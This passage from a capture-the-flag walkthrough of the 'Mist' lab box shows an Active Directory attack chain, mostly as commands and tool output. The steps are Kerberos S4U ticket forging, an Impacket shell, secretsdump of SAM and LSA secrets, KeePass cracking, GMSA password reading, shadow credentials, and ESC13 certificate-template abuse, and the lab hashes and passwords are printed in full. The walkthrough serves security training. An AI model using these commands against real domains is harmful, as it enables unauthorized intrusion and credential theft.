hvXac4+SIkS/fuO+zI2LJImBSl1ODhKGR7SvvAIaYK4L0kWrbMiOR0vdq/CyFkW1TOzOdZiwUCKI21B6JJoq9BVwpJwSggDWX0o3fYRXbjDYnicCoObcZoAKfB1xOeQDNs0dA60LDgugX8gr+ely0WY/KcY/MgwTWjmlG0VenYE26kyWwjVmQvV1PseEG0FhV312N7Qo6/UwYYwnXCoO5kzWm1w0dvnt6aqk9gYLt/yzjkJdBndVHaOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEMmi9nszm+yraE4k4LTdgjWhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyMzE4MDEyOVqmERgPMjAyNDEwMjQwNDAxMjlapxEYDzIwMjQxMDMwMTgwMTI5WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'ms01$@MIST.HTB'
[*] Using domain controller: DC01.mist.htb (192.168.100.100)
[*] Sending S4U2self request to 192.168.100.100:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/ms01.mist.htb'
[*] Got a TGS for 'Administrator' to 'cifs@MIST.HTB'
[*] base64(ticket.kirbi):

      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

```

To use this ticket on my Linux host, I’ll need to convert it. I’ll save the base64 string to a file, and decode it. Then I’ll use `ticketConverter.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)) to convert it to a CCACHE format:

```

oxdf@hacky$ base64 -d administrator.kirbi.b64 > administrator.kirbi
oxdf@hacky$ ticketConverter.py administrator.kirbi administrator.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

### Shell

This ticket is good enough to get a shell:

```

oxdf@hacky$ KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py administrator@ms01.mist.htb -k -no-pass 
Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>

```

And `user.txt`:

```

C:\users\administrator\desktop>type user.txt
f95a1c7f************************

```

### secretsdump

I can also use the `administrator.ccache` to run `secretsdump`, giving me a bit of a save point on the box:

```

oxdf@hacky$ KRB5CCNAME=administrator.ccache proxychains -q secretsdump.py administrator@ms01.mist.htb -k -no-pass
Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::
[*] Dumping cached domain logon information (domain/username:hash)
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MIST\MS01$:plain_password_hex:67614abc13168b57abcbaad0b320f42d6d248474f73f8c6d3cc427f68128c10308537af77ca9633a45c2c51b1424a4796874a1270ce1d827471c0195cbb1bcdd128b095cc7f80d35e6049149e3d5417f5e78693323ba40c1ab324badd2bba91dd3071c1b2eb8d20236d11f06f319dd16558578c8992ef6e7a75ebbcb33bfa755685e9917aac2511ad827970b1b94229e32042b218205ecc4d6ac8ef94214c3909e1850b4f8a7bbbb9bc7b63db0cd4ca1b8e957443cdfe33db94f346d8ea804ccef1d10526444600055fe38f4aa5c40692483e4701f2eb5bbe537c5b33d34d55add2cf241465b28531c723b8e2e546a3d
MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:d682d620b887a24491038115b6dc56bb:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
[*] NL$KM
 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.
 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.
 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.
 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb
NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
[*] _SC_ApacheHTTPServer
svc_web:MostSavagePasswordEver123
[*] Cleaning up...
[*] Stopping service RemoteRegistry

```

This gives me a bit of a save point, as now if I can create the tunnel, I can get a shell directly as the administrator without going back through the other steps:

```

oxdf@hacky$ proxychains -q evil-winrm -i localhost -u administrator -H 711e6a685af1c31c4029c3c7681dd97b
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

## Shell as op\_Sharon.Mullard on Mist

### Enumeration

#### Home Directories

As Administrator, I have full access to the MS01 system. There are multiple other users on the box:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/20/2024   6:28 AM                Administrator
d-----         2/20/2024   6:02 AM                Administrator.MIST
d-----         3/20/2024   5:42 AM                Brandon.Keywarp
d-r---         2/20/2024   5:44 AM                Public
d-----         2/20/2024   9:39 AM                Sharon.Mullard
d-----         2/21/2024   3:46 AM                svc_web

```

Sharon.Mullard has a KeePass database, as well as some images in their home directory:

```
*Evil-WinRM* PS C:\Users\Sharon.Mullard> tree . /f
Folder PATH listing
Volume serial number is 00000154 560D:8100
C:\USERS\SHARON.MULLARD
+---Desktop
+---Documents
¦       sharon.kdbx
¦
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
¦       cats.png
¦       image_20022024.png
¦
+---Saved Games
+---Videos

```

I’ll download all three files.

#### KeePass

To open the database, I’ll need the password:

```

oxdf@hacky$ kpcli --kdb=sharon.kdbx 
Provide the master password:

```

The `cats.png` image isn’t anything useful, but the other one is:

![](/img/image_20022024.png)

It shows a [Cyberchef](https://gchq.github.io/CyberChef/) window with a password being base64-encoded. The input is 15 character (as can be seen just above the word “Output”), and starts with these 14 characters: “UA7cpa[#1!\_\*ZX”.

### Recover Password

#### Crack KeePass Master Password

I’ll use `keepass2john` to generate a hash from the database:

```

oxdf@hacky$ keepass2john sharon.kdbx | tee sharon.kdbx.hash
sharon:$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc

```

I’ll pass this to `hashcat` using `-a 3` to use mask mode and giving it “UA7cpa[#1!\_\*ZX?a” as the password, where `?a` represents any character. Auto-detect hash mode finds two possible hash formats, and this one is 13400:

```

$ hashcat --user sharon.kdbx.hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a'
hashcat (v6.2.6) starting
...[snip]...
$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc:UA7cpa[#1!_*ZX@
...[snip]...

```

It finds the missing character.

#### Read Password from KeePass

That password works to get into the database:

```

oxdf@hacky$ kpcli --kdb=sharon.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>

```

There’s a password for “operative account”:

```

kpcli:/> show -f "sharon/operative account"

 Path: /sharon/
Title: operative account
Uname: 
 Pass: ImTiredOfThisJob:(
  URL: https://keepass.info/
Notes: Notes

```

### Identify User

The password doesn’t work for Sharon.Mullard on either DC01 or MS01:

```

oxdf@hacky$ sudo proxychains -q netexec smb DC01 -u sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [-] mist.htb\sharon.mullard:ImTiredOfThisJob:( STATUS_LOGON_FAILURE 
oxdf@hacky$ sudo proxychains -q netexec smb MS01 -u sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [-] mist.htb\sharon.mullard:ImTiredOfThisJob:( STATUS_LOGON_FAILURE

```

Looking back at Bloodhound, typing “Sha” into the “Search” bar shows another account:

![image-20241023165009126](/img/image-20241023165009126.png)

That one works with the password for SMB *and* WinRM:

```

oxdf@hacky$ sudo proxychains -q netexec smb MS01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( 
oxdf@hacky$ sudo proxychains -q netexec smb DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( 
oxdf@hacky$ sudo proxychains -q netexec winrm DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
WINRM       192.168.100.100 5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:mist.htb)
WINRM       192.168.100.100 5985   DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( (Pwn3d!)

```

### Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) over `proxychains` works to get a shell on DC01:

```

oxdf@hacky$ sudo proxychains -q evil-winrm -i DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents>

```

## Auth as svc\_ca$

### Enumeration

In addition to being a Domain User with the certificate stuff, op\_Sharon.Mullard is in the Operatives group, which has `ReadGMSAPassword` over the SVC\_CA$ account:

![image-20241023165522637](/img/image-20241023165522637.png)

### Get Password Hash

I can pull that password hash using `netexec`:

```

oxdf@hacky$ sudo proxychains -q netexec ldap DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:(' --gmsa
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAPS       192.168.100.100 636    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( 
LDAPS       192.168.100.100 636    DC01             [*] Getting GMSA Passwords
LDAPS       192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 07bb1cde74ed154fcec836bc1122bdcc

```

It works (though not over WinRM):

```

oxdf@hacky$ sudo proxychains -q netexec smb DC01 -u 'svc_ca$' -H 07bb1cde74ed154fcec836bc1122bdcc
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_ca$:07bb1cde74ed154fcec836bc1122bdcc

```

## Auth as svc\_cabackup

### Enumeration

Still in Bloodhound, the svc\_ca$ account is a member of the Certificate Services group, which has another certificate template it can enroll in, but more importantly, it has `AddKeyCredentialLink` over svc\_cabackup:

![image-20241023171511540](/img/image-20241023171511540.png)

### Add Shadow Credential

I’ll use `certipy` to add the shadow credential:

```

oxdf@hacky$ sudo proxychains -q certipy shadow auto -username 'svc_ca$@mist.htb' -hashes :07bb1cde74ed154fcec836bc1122bdcc -account svc_cabackup
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_cabackup'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8a29ef4d-133a-94e6-7b85-fe44e4bac17e'
[*] Adding Key Credential with device ID '8a29ef4d-133a-94e6-7b85-fe44e4bac17e' to the Key Credentials for 'svc_cabackup'
[*] Successfully added Key Credential with device ID '8a29ef4d-133a-94e6-7b85-fe44e4bac17e' to the Key Credentials for 'svc_cabackup'
[*] Authenticating as 'svc_cabackup' with the certificate
[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_cabackup.ccache'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Restoring the old Key Credentials for 'svc_cabackup'
[*] Successfully restored the old Key Credentials for 'svc_cabackup'
[*] NT hash for 'svc_cabackup': c9872f1bc10bdd522c12fc2ac9041b64

```

It works:

```

oxdf@hacky$ sudo proxychains -q netexec smb DC01 -u 'svc_cabackup' -H c9872f1bc10bdd522c12fc2ac9041b64
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_cabackup:c9872f1bc10bdd522c12fc2ac9041b64

```

## Shell as Administrator

### ESC13 Background

In February 2024, Spector Ops published new research entitled [ADCS ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53) detailing another ADCS misconfiguration. This one has to do with templates that have an insurance policy having an OID group link to an AD group. A template has an insurance policy, and that policy can have a link to a group such that users who authenticate with that certificate get a token with membership in this group. Spector Ops lays out the requirements for ESC13 as follows:
1. The principal has enrollment rights on a certificate template.
2. The certificate template has an issuance policy extension.
3. The issuance policy has an OID group link to a group.
4. The certificate template has no issuance requirements the principal cannot meet.
5. The certificate template defines EKUs that enable client authentication.

### ESC13 Enumeration

#### Check-ADCSESC13.ps1

There are a few ways to check for ESC13. There’s a PowerShell script, [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) designed to just exactly that. I’ll save a copy, upload it to DC01, and run it:

```
*Evil-WinRM* PS C:\programdata> . .\Check-ADCSESC13.ps1
Enumerating OIDs
------------------------
OID 14514029.01A0D91BA39F2716F6917FF97B18C130 links to group: CN=Certificate Managers,CN=Users,DC=mist,DC=htb

OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb
------------------------
OID 979197.E044723721C6681BECDB4DDD43B151CC links to group: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb

OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
------------------------
Enumerating certificate templates
------------------------
Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb

Certificate template Name: ManagerAuthentication
OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb
------------------------
Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb

Certificate template Name: BackupSvcAuthentication
OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
------------------------
Done

```

The ManagerAuthentication template can be used to get membership in Certificate Managers:

```

Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb

```

Additionally, BackupSvcAuthentication can be used to get membership in ServiceAccounts:

```

Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb

```

#### Bloodhound Pre-Defined Query

There’s a pre-defined query in Bloodhound-CE to see this visually by going to “Cypher”, clicking the folder icon, and then scrolling down to the bottom of the ADCS section to find “Enrollment rights on CertTemplates with OIDGroupLink”:

![image-20241023174611495](/img/image-20241023174611495.png)

Running that gives:

![image-20241023174718161](/img/image-20241023174718161.png)

There’s two `OIDGroupLink` links in this chart. What’s actually missing from that image is that the Certificate Managers group is a member of the CA Backup group, and that the ServiceAccounts group is a member of the Backup Operators group. Using the Pathfinding tab shows this nicely:

![image-20241023204609810](/img/image-20241023204609810.png)

#### Updated Certipy

There’s also a [pull request](https://github.com/ly4k/Certipy/pull/196) on Certipy to add detection logic in for ESC13. Running this version does find the vulnerable template:

```

oxdf@hacky$ sudo proxychains -q certipy find -vulnerable -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dc-ip 192.168.100.100 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 2 OIDs linked to templates
[*] Trying to get CA configuration for 'mist-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'mist-DC01-CA' via CSRA: Can't find a valid stringBinding to connect
[*] Trying to get CA configuration for 'mist-DC01-CA' via RRP
[*] Got CA configuration for 'mist-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : mist-DC01-CA
    DNS Name                            : DC01.mist.htb
    Certificate Subject                 : CN=mist-DC01-CA, DC=mist, DC=htb
    Certificate Serial Number           : 3BF0F0DDF3306D8E463B218B7DB190F0
    Certificate Validity Start          : 2024-02-15 15:07:23+00:00
    Certificate Validity End            : 2123-02-15 15:17:23+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MIST.HTB\Administrators
      Access Rights
        ManageCertificates              : MIST.HTB\Administrators
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
        ManageCa                        : MIST.HTB\Administrators
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
        Enroll                          : MIST.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : ManagerAuthentication
    Display Name                        : ManagerAuthentication
    Certificate Authorities             : mist-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Server Authentication
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
    Linked Groups                       : CN=Certificate Managers,CN=Users,DC=mist,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : MIST.HTB\Certificate Services
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : MIST.HTB\Administrator
        Write Owner Principals          : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
        Write Dacl Principals           : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
        Write Property Principals       : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
    [!] Vulnerabilities
      ESC13                             : 'MIST.HTB\\Certificate Services' can enroll, template allows client authentication and issuance policy is linked to group ['CN=Certificate Managers,CN=Users,DC=mist,DC=htb']

```

I’ll note this line for exploitation:

```

Minimum RSA Key Length              : 4096

```

### Exploit

#### Overview

To abuse this, I’ll take the following steps:
- Get a certificate as svc\_cabackup using the ManagerAuthentication template to gain access to the Certificate Managers group.
- Use that certificate to get a Kerberos ticket.
- Get a certificate as svc\_cabackup using the BackupSvcAuthentication template (which can now be accessed as a member of Certificate Managers) to gain access to the ServiceAccounts group.
- Use that certificate to get a Kerberos ticket.
- Use the Kerberos ticket to authenticate to DC01 and exfil registry hives using Backup Operators privileges.
- Local `secretsdump.py` to extract hashes for DC01.
- Use administrator NTLM to get a shell on DC01.

While above I used an fork of `certipy` to identify ESC13, the current version can do all the steps necessary to exploit it.

#### Access Certificate Managers Group

I’ll start by getting a certificate for svc\_cabackup with the ManagerAuthentication template. It fails initially:

```

oxdf@hacky$ sudo proxychains -q certipy req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 61
Would you like to save the private key? (y/N) N
[-] Failed to request certificate

```

I’ll need to add `-key-size 4096`:

```

oxdf@hacky$ sudo proxychains -q certipy req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 63
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'

```

Now I’ll use that to get a Kerberos ticket using that certificate:

```

oxdf@hacky$ sudo proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64

```

I’ll convert that ticket to the ccache format that can be used on Linux:

```

oxdf@hacky$ ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

#### Access ServiceAccounts Group

I’m going to make the same `certipy req` call as above, but this time authenticate using Kerberos, and request from the BackupSvcAuthentication template. If I had tried that before, it fails:

```

oxdf@hacky$ sudo proxychains -q certipy req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template BackupSvcAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
